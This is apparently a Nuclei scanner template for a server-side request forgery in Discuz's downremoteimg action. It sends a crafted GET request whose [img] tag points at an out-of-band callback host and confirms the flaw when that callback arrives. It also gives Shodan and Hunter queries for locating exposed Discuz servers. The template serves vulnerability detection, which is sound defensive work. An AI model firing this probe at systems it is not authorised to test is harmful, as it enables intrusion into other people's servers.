id: discuz-downremoteimg-ssrf
info:
  author: pwnhxl
  description: Discuz DownRemoteImg - Server-Side Request Forgery
  metadata:
    hunter-query: web.body="Discuz! X3.1"
    shodan-query: title:"Powered by Discuz"
    verified: 'true'
  name: Discuz DownRemoteImg - Server-Side Request Forgery
  reference:
  - https://www.seebug.org/vuldb/ssvid-91879
  - https://cloud.tencent.com/developer/article/1511949
  - https://github.com/opensec-cn/kunpeng/blob/master/plugin/go/discuzSSRF.go
  severity: high
  tags: discuz,ssrf,oast
requests:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: body
    type: word
    words:
    - ATTACHORIMAGE
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/forum.php?mod=ajax&action=downremoteimg&message=[img]http://{{interactsh-url}}/test?.jpg[/img]'
